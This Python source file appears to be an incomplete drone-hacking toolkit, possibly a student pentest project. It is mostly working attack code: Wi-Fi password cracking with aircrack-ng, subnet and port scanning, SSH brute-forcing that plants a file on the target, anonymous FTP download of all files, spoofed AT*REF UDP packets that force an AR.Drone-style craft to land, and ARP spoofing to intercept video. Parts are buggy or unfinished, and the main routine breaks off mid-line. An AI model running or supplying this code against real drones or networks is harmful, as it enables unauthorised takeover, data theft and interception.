import subprocess
import re
import socket
import os
import hashlib
import signal
import math
from time import sleep
import sys
from scapy.all import *
import paramiko
from scapy.all import ARP, Ether, srp
import ipaddress
from datetime import datetime
from ftplib import FTP
import telnetlib
import json
from concurrent.futures import ThreadPoolExecutor


# Authentication
class UserManagement:
    def __init__(self):
        self.users = self.load_users()

    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()

    def load_users(self):
        try:
            with open("users.json", "r") as file:
                return json.load(file)
        except FileNotFoundError:
            return {}
        except json.JSONDecodeError:
            print("Error: Invalid JSON data in users.json file.")
            return {}

    def save_users(self):
        with open("users.json", "w") as file:
            json.dump(self.users, file)

    def login(self):
        username = input("Enter username: ")
        password = input("Enter password: ")
        hashed_password = self.hash_password(password)
        if username in self.users and self.users[username]["password"] == hashed_password:
            print("Login successful!")
            return True
        else:
            print("Invalid username or password.")
            return False

    def create_user(self):
        username = input("Enter new username: ")
        if username in self.users:
            print("Username already exists.")
            return
        password = input("Enter new password: ")
        hashed_password = self.hash_password(password)
        self.users[username] = {"password": hashed_password}
        self.save_users()
        print("User created successfully.")

#  Select Interface 
class InterfaceManager:
    def __init__(self):
        pass

    def get_available_interfaces(self):
        return get_if_list()

    def get_user_input(self):
        # Display available interfaces
        print("Available interfaces:")
        interfaces = self.get_available_interfaces()
        for i, iface in enumerate(interfaces):
            print(f"{i + 1}. {iface}")

        # Prompt user to choose an interface
        interface_choice = input("Choose the interface (enter the number): ")
        try:
            interface_index = int(interface_choice) - 1
            interface = interfaces[interface_index]
            return interface
        except (ValueError, IndexError):
            print("Invalid choice. Exiting.")
            sys.exit(1)

# Scan WiFi Networks 
class WiFi_toolkit:
    def __init__(self, interface):
        self.interface = interface

    def scan(self):
        """Scan for available Wi-Fi networks and retrieve detailed information using iwlist."""
        output = subprocess.check_output(f"iwlist {self.interface} scan", shell=True).decode()

        networks = []
        current_network = {}

        for line in output.split("\n"):
            if "Cell" in line:
                if current_network:
                    networks.append(current_network)
                current_network = {"ESSID": None, "Channel": None, "Frequency": None, "Quality": None}
            elif "ESSID:" in line:
                current_network["ESSID"] = line.split(":")[1].strip().strip('"')
            elif "Channel:" in line:
                current_network["Channel"] = line.split(":")[1]
            elif "Frequency:" in line:
                frequency_match = re.search(r"(\d+\.\d+) GHz", line)
                if frequency_match:
                    current_network["Frequency"] = frequency_match.group(1)
            elif "Quality=" in line:
                match = re.search(r"(\d+/\d+)", line)
                if match:
                    current_network["Quality"] = match.group(1)

        if current_network: 
            networks.append(current_network)

        return networks

    def display(self):
        networks = self.scan()
        print("{:<20} {:<10} {:<15} {:<15}".format("ESSID", "Channel", "Frequency", "Quality"))
        for network in networks:
            essid = network["ESSID"] if network["ESSID"] is not None else ""
            channel = network["Channel"] if network["Channel"] is not None else ""
            frequency = network["Frequency"] if network["Frequency"] is not None else ""
            quality = network["Quality"] if network["Quality"] is not None else ""
            print("{:<20} {:<10} {:<15} {:<15}".format(essid, channel, frequency, quality))

    def select_network(self):
        networks = self.scan()
        print("{:<5} {:<20} {:<10} {:<15} {:<15}".format("Index", "ESSID", "Channel", "Frequency", "Quality"))
        for i, network in enumerate(networks):
            essid = network["ESSID"] if network["ESSID"] is not None else ""
            channel = network["Channel"] if network["Channel"] is not None else ""
            frequency = network["Frequency"] if network["Frequency"] is not None else ""
            quality = network["Quality"] if network["Quality"] is not None else ""
            print("{:<5} {:<20} {:<10} {:<15} {:<15}".format(i, essid, channel, frequency, quality))

        selected_index = input("Enter the index of the WiFi network you want to connect to: ")
        try:
            selected_index = int(selected_index)
            if 0 <= selected_index < len(networks):
                selected_network = networks[selected_index]
                essid = selected_network["ESSID"]
                print(f"You've selected '{essid}'")
                return essid
            else:
                print("Invalid index. Please enter a valid index.")
        except ValueError:
            print("Invalid input. Please enter a number.")

    def crack_password(selected_network, wordlist_path):
        essid = selected_network.get("ESSID")
        if essid is None:
            print("Error: Selected network does not have an ESSID.")
            return

        # Run aircrack-ng with the specified wordlist to crack the password
        try:
            result = subprocess.run(["aircrack-ng", "-e", essid, "-w", wordlist_path], capture_output=True, text=True)
            output = result.stdout
            # Extract the password if found
            password = None
            for line in output.split('\n'):
                if 'KEY FOUND' in line:
                    password = line.split(':')[1].strip()
                    break
            if password:
                print(f"Password for network '{essid}': {password}")
            else:
                print(f"Password for network '{essid}' not found in the wordlist.")
        except FileNotFoundError:
            print("Error: Aircrack-ng not found. Please make sure it is installed and in your PATH.")
    
    # Connect to WiFi Network
    def connect_to_wifi(wifi_name, password):
        command = f'nmcli device wifi connect "{wifi_name}" password "{password}"'
        try:
            subprocess.run(command, shell=True, check=True)
            print(f"Connected to {wifi_name} successfully.")
        except subprocess.CalledProcessError:
            print(f"Failed to connect to {wifi_name}.")

    def extract_subnet(interface):
        try:
            # Get the IP address and netmask for the interface using the 'ip addr' command
            output = subprocess.check_output(["ip", "addr", "show", interface], text=True)
        except subprocess.CalledProcessError as e:
            print(f"Error: Unable to execute 'ip addr show {interface}' command.", e)
            return None

        cidr = None
        lines = output.splitlines() 
        for line in lines:
            if "inet " in line:
                parts = line.split()
                ip_address = parts[1].split("/")[0]
                cidr = parts[1]
                break

        if cidr is None:
            print(f"Error: Unable to extract CIDR notation for interface {interface}.")
            return None

        return cidr

    def get_devices(cidr):
        """Get a list of devices connected to the local network using ARP requests."""
        # Create an ARP request packet
        local_subnet = cidr  # Replace with your actual local subnet

        arp = ARP(pdst=local_subnet)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        # Send the packet and capture the response
        result = srp(packet, timeout=3, verbose=0)[0]

        # Extract the MAC and IP addresses from the response
        devices = []
        for res in result:
            device_info = {"mac": res[1].hwsrc, "ip": res[1].psrc, "name": WiFi_toolkit.get_device_name(res[1].psrc)}
            devices.append(device_info)
        return devices
    
    def get_device_name(ip_address):
        try:
            # Attempt to resolve the device name using NetBIOS queries
            hostname, _, _ = socket.gethostbyaddr(ip_address)
            return hostname.split(".")[0]  # Use only the hostname part
        except (socket.herror, socket.gaierror):
            return ""  # Return an empty string if unable to resolve the device name
        
    def select_target_device(cidr):
        devices = WiFi_toolkit.get_devices(cidr)
        
        print("Available devices:")
        for i, device in enumerate(devices):
            print(f"{i + 1}. {device['name']} ({device['ip']})")
        
        while True:
            try:
                choice = int(input("Enter the index of the device you want to select as target: "))
                if 1 <= choice <= len(devices):
                    selected_device = devices[choice - 1]
                    return selected_device['ip']
                else:
                    print("Invalid choice. Please enter a valid index.")
            except ValueError:
                print("Invalid input. Please enter a number.")
      
# Get Drone Manufacturer
class DroneSelector:
    def __init__(self):
        self.manufacturers = ["DJI","Parrot","Yuneec"]

    def add_manufacturer(self, name):
        self.manufacturers.append(name)

    def select_manufacturer(self):
        if not self.manufacturers:
            print("No manufacturers available.")
            return None
        print("Available Manufacturers:")
        for index, manufacturer in enumerate(self.manufacturers, start=1):
            print(f"{index}. {manufacturer}")
        choice = input("Enter the number corresponding to the manufacturer: ")
        try:
            choice_index = int(choice) - 1
            if 0 <= choice_index < len(self.manufacturers):
                print(f"You selected {self.manufacturers[choice_index]} as the manufacturer.")
                return self.manufacturers[choice_index]
            else:
                print("Invalid choice. Please select a valid manufacturer.")
                return None
        except ValueError:
            print("Invalid input. Please enter a number.")
            return None

# Port Scanning
class PortScanner:
    def __init__(self, target_host):
        self.target_host = target_host
        self.open_ports = []

    def scan_ports(self):
        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)  # Adjust timeout as needed
                    result = s.connect_ex((self.target_host, port))
                    if result == 0:
                        service = socket.getservbyport(port)
                        self.open_ports.append((port, service))
                        try:
                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_version:
                                s_version.settimeout(1)  # Adjust timeout as needed
                                s_version.connect((self.target_host, port))
                                s_version.sendall(b"GET / HTTP/1.0\r\n\r\n")
                                banner = s_version.recv(1024).decode("utf-8")
                                print(f"Version: {banner.strip()}")
                        except socket.error:
                            pass
            except socket.error:
                pass

        print(f"Scanning host: {self.target_host}")
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(scan_port, port) for port in range(1, 1001)]  # Scan common ports
            for future in futures:
                future.result()  # Wait for all tasks to complete
        return self.open_ports

# SSH Hacking
class SSHBruteForce:
    def __init__(self, host, open_ports, usernames_file, passwords_file):
        self.host = host
        self.open_ports = open_ports
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file

    def check_ssh_port(self):
        return any(port == 22 for port, _ in self.open_ports)
    
    def brute_force_ssh(self):
        if not self.check_ssh_port():
            print("[-] SSH port (22) is closed.")
            return

        with open(self.usernames_file, 'r') as users:
            for username in users:
                username = username.strip()
                with open(self.passwords_file, 'r') as passwords:
                    for password in passwords:
                        password = password.strip()
                        try:
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            ssh.connect(self.host, port=22, username=username, password=password)
                            print(f"[*] Found credentials: {username}:{password}")
                            self.create_file_on_ssh(ssh)
                            return
                        except paramiko.AuthenticationException:
                            print(f"[-] Invalid credentials: {username}:{password}")
                        finally:
                            ssh.close()

    def create_file_on_ssh(self, ssh):
        sftp = ssh.open_sftp()
        sftp.put(localpath='PoC.txt', remotepath='/home/PoC.txt')
        sftp.close()
        print("[+] File 'PoC.txt' created on the drone.")

# FTP Hacking
class DroneFTPConnector:
    def __init__(self, drone_ip, open_ports):
        self.drone_ip = drone_ip
        self.open_ports = open_ports
        self.ftp = FTP()

    def check_ftp_port(self):
        return any(port == 21 for port, _ in self.open_ports)

    def connect(self):
        if not self.check_ftp_port():
            print("[-] FTP port (21) is closed.")
            return
        try:
            self.ftp.connect(self.drone_ip)
            self.ftp.login()  # Null session login (anonymous)
            print("Connected to FTP server successfully.")
        except Exception as e:
            print(f"Failed to connect to FTP server: {e}")

    def list_files(self):
        if not self.check_ftp_port():
            return
        try:
            files = self.ftp.nlst()
            print("Files in the current directory:")
            for file in files:
                print(file)
        except Exception as e:
            print(f"Failed to list files: {e}")

    def download_files(self):
        if not self.check_ftp_port():
            return
        try:
            files = self.ftp.nlst()
            print("Downloading files:")
            for file in files:
                with open(file, 'wb') as f:
                    self.ftp.retrbinary('RETR ' + file, f.write)
                    print(f"Downloaded {file}")
        except Exception as e:
            print(f"Failed to download files: {e}")

    def disconnect(self):
        if not self.check_ftp_port():
            return
        try:
            self.ftp.quit()
            print("Disconnected from FTP server.")
        except Exception as e:
            print(f"Error while disconnecting: {e}")

# Telnet Hacking
class TelnetConnector:
    def __init__(self, drone_ip, open_ports):
        self.drone_ip = drone_ip
        self.open_ports = open_ports
        self.telnet = telnetlib.Telnet()

    def check_telnet_port(self):
        return any(port == 23 for port, _ in self.open_ports)

    def connect(self):
        if not self.check_telnet_port():
            print("[-] Telnet port (23) is closed.")
            return
        try:
            self.telnet.open(self.host, self.port)
            print("Connected to Telnet server successfully.")
        except Exception as e:
            print(f"Failed to connect to Telnet server: {e}")

    def get_kernel_version(self):
        try:
            # Send command to get kernel version
            self.telnet.write(b'uname -r\n')
            
            # Read response
            kernel_version = self.telnet.read_until(b'\n').decode().strip()
            
            print("Kernel version:", kernel_version)
        except Exception as e:
            print(f"Failed to get kernel version: {e}")

    def disconnect(self):
        try:
            self.telnet.close()
            print("Disconnected from Telnet server.")
        except Exception as e:
            print(f"Error while disconnecting: {e}")

# Drone Spoofing
#class DroneSpoofing:
    # Get drone MAC address

# Drone Conroller
class DroneController:
    def __init__(self, srcIP, dstIP, srcPort, dstPort, srcMAC, dstMAC, interface="wlan0"):
        self.srcIP = srcIP
        self.dstIP = dstIP
        self.srcPort = srcPort
        self.dstPort = dstPort
        self.srcMAC = srcMAC
        self.dstMAC = dstMAC
        self.interface = interface

    def send_spoofed_packets(self):
        print("Sending spoofed land packets")
        for i in range(1, 10):
            payload = "AT*REF=" + str(1000000 + i) + ",290717696\r"
            print(payload)
            spoofed_packet = Ether(src=self.srcMAC, dst=self.dstMAC) / \
                             IP(src=self.srcIP, dst=self.dstIP) / \
                             UDP(sport=self.srcPort, dport=self.dstPort) / payload
            sendp(spoofed_packet, iface=self.interface)
            sleep(0.3)

    def restore_control(self):
        print("Wait 5 seconds before restoring control")
        sleep(5)
        print("Send a spoofed packet with seq=1 to restore control")
        payload = "AT*REF=1,290717696\r"
        print(payload)
        spoofed_packet = Ether(src=self.srcMAC, dst=self.dstMAC) / \
                         IP(src=self.srcIP, dst=self.dstIP) / \
                         UDP(sport=self.srcPort, dport=self.dstPort) / payload
        sendp(spoofed_packet, iface=self.interface)

# turnon camera 


# Dump

# ARP Spoofing & Vidieo Intercepting
class ARPSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.processes = []

    def start(self):
        # Start ARP spoofing from target to spoof IP
        command_target = ["arpspoof", "-i", self.interface, "-t", self.target_ip, self.spoof_ip]
        process_target = subprocess.Popen(command_target)

        # Start ARP spoofing from spoof IP to target
        command_spoof = ["arpspoof", "-i", self.interface, "-t", self.spoof_ip, self.target_ip]
        process_spoof = subprocess.Popen(command_spoof)

        self.processes.append(process_target)
        self.processes.append(process_spoof)

        print("[+] ARP spoofing started...")

    def stop(self):
        # Stop ARP spoofing processes
        for process in self.processes:
            process.terminate()
        print("[+] ARP spoofing stopped.")

# Vieo Intercepting
        
# Report

# metigations

            
# main  
'''def main():
    user_manager = UserManagement()
    if not user_manager.login():
        return

    interface_manager = InterfaceManager()
    interface = interface_manager.get_user_input()

    wifi_toolkit = WiFi_toolkit(interface)
    wifi_toolkit.display()
    wifi_name = wifi_toolkit.select_network()
    password = input("Enter the password for the selected network: ")
    wifi_toolkit.connect_to_wifi(wifi_name, password)

    subnet = wifi_toolkit.extract_subnet(interface)
    target_ip = wifi_toolkit.select_target_device(subnet)

    port_scanner = PortScanner(target_ip)
    open_ports = port_scanner.scan_ports()
    print("Open ports:")
    for port, service in open_ports:
        print(f"{port}/{service}")

    ssh_brute_force = SSHBruteForce(target_ip, open_ports, "usernames.txt", "passwords.txt")
    ssh_brute_force.brute_force_ssh()

    drone_selector = DroneSelector()
    manufacturer = drone'''